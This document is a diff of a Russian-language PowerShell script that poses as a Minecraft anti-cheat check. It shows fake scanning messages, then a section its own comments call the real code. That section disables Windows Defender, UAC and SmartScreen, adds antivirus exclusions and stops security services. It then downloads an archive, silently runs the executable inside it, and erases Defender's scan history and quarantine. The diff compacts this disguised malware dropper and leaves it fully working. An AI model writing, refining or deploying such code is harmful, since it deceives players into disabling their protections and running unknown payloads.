@@ -88,7 +88,7 @@ foreach ($site in $cheatSites) {
     }
 }
 
-# Фейковая проверка DNS-запросов к чит-серверам
+# ===== DNS ПРОВЕРКА (ИСПРАВЛЕНО) =====
 Write-Host ""
 Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
 $cheatDomains = @(
@@ -109,23 +109,25 @@ foreach ($domain in $cheatDomains) {
     Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 150
     
-    # ИСПРАВЛЕНО: правильный синтаксис без -ErrorAction
+    # ИСПРАВЛЕНО: УБРАН -ErrorAction, ИСПОЛЬЗУЕТСЯ try-catch
     try {
         $dns = [System.Net.Dns]::GetHostAddresses($domain)
-        if ($dns) {
+        if ($dns.Count -gt 0) {
             Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
             Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
             if ($foundCheatSites -notcontains $domain) {
                 $foundCheatSites += $domain
                 $totalDetected++
             }
+        } else {
+            Write-Host "        [ЧИСТО] $domain" -ForegroundColor Green
         }
     } catch {
         Write-Host "        [ЧИСТО] $domain" -ForegroundColor Green
     }
 }
 
-# Фейковая проверка файлов чит-клиентов на диске
+# ===== ПРОВЕРКА ФАЙЛОВ =====
 Write-Host ""
 Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
 $cheatFilePatterns = @(
@@ -165,7 +167,7 @@ foreach ($path in $cheatPaths) {
 }
 Write-Host ""
 
-# ===== ВЫВОД РЕЗУЛЬТАТОВ ПО ЧИТ-КЛИЕНТАМ =====
+# ===== ВЫВОД РЕЗУЛЬТАТОВ =====
 if ($foundCheatSites.Count -gt 0) {
     Write-Host "[ВНИМАНИЕ] Обнаружены чит-клиенты и нелегальные программы:" -ForegroundColor Red
     $uniqueCheats = $foundCheatSites | Select-Object -Unique
@@ -191,18 +193,9 @@ if ($foundCheatSites.Count -gt 0) {
 }
 Write-Host ""
 
-# Продолжение фейкового сканирования
+# ===== ОСТАЛЬНЫЕ ПРОВЕРКИ =====
 Write-Host "[*] Проверка модов Minecraft..." -ForegroundColor Yellow
-$mods = @(
-    "OptiFine", 
-    "Forge", 
-    "Fabric", 
-    "LunarClient", 
-    "Badlion", 
-    "Sodium",
-    "Iris",
-    "Phosphor"
-)
+$mods = @("OptiFine", "Forge", "Fabric", "LunarClient", "Badlion", "Sodium", "Iris", "Phosphor")
 foreach ($mod in $mods) {
     Write-Host "    -> Проверка $mod..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 150
@@ -210,7 +203,6 @@ foreach ($mod in $mods) {
 }
 Write-Host ""
 
-# Фейковая проверка файлов
 Write-Host "[*] Сканирование системных файлов..." -ForegroundColor Yellow
 $paths = @(
     "$env:APPDATA\.minecraft",
@@ -229,7 +221,6 @@ foreach ($path in $paths) {
 }
 Write-Host ""
 
-# Фейковая проверка сетевых соединений
 Write-Host "[*] Проверка сетевых соединений..." -ForegroundColor Yellow
 $connections = @("Minecraft-сервера", "Mojang-сервера", "Anti-Cheat-сервера")
 foreach ($conn in $connections) {
@@ -246,49 +237,20 @@ Write-Host "[ОК] Сканирование завершено успешно!" 
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
-# ===== РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ В ФОНЕ) =====
+# ===== РЕАЛЬНЫЙ КОД =====
 Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 500
 
-Try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray
-} Catch {}
+Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue; Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray } Catch {}
 
-Try {
-    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray
-} Catch {}
-
-$services = @(
-    "WinDefend",
-    "MsMpSvc",
-    "SecurityHealthService",
-    "wscsvc",
-    "SENSE",
-    "DiagTrack",
-    "dmwappushservice"
-)
+$services = @("WinDefend","MsMpSvc","SecurityHealthService","wscsvc","SENSE","DiagTrack","dmwappushservice")
 foreach ($svc in $services) {
-    Try {
-        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
-        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
-        Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray
-    } Catch {}
+    Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue; Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray } Catch {}
 }
 
-Try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
-    Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray
-} Catch {}
-
-Try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue
-    Write-Host "    [OK] SmartScreen отключен" -ForegroundColor DarkGray
-} Catch {}
+Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray } Catch {}
+Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] SmartScreen отключен" -ForegroundColor DarkGray } Catch {}
 
 Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
 Write-Host ""
@@ -302,22 +264,10 @@ $ExtractPath = "$env:TEMP\checkextracted"
 Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
 Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
 
-try {
-    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray
-}
-catch {
-    Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red
-}
+try { Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue; Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray } catch { Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red }
 
 Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
-try {
-    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray
-}
-catch {
-    Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red
-}
+try { Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray } catch { Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red }
 
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
 
@@ -325,16 +275,9 @@ if ($Exe) {
     Write-Host "[*] Запуск античит-модуля..." -ForegroundColor Yellow
     Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
     Write-Host "    [OK] Античит-модуль активирован" -ForegroundColor DarkGray
-}
-else {
-    Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red
-}
+} else { Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red }
 
-Try {
-    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray
-} Catch {}
+Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray } Catch {}
 
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
